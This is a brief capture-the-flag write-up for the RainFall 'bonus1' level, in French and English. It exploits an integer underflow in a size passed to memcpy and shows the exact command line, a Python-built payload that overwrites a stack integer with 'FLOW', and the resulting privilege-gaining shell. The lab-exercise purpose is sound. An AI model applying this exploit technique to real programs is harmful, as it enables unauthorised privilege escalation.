# Bonus 1

Le programme a besoin de 2 paramètres, un entier inférieur à 10 et une chaîne qui sera copiée avec memcpy d'une taille du premier parametre fois 4. On peut donc faire un underflow sur le premier parametre qui sera parse avec atoi et ensuite donne a memcpy en 3eme parametre et multiplie par 4. Il y aura donc une conversion implicite d'int vers size_t

with gdb we find in the stack the position of the integer, just after the buffer
Calculate with bc
```
2147483648 / 4
536870912
536870912 - 10
536870902
536870902 * 2
1073741804
```
```
bonus1@RainFall:~$ ./bonus1 -1073741813 `python -c 'print("A" * 40 + "\x46\x4c\x4f\x57")'`
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
```
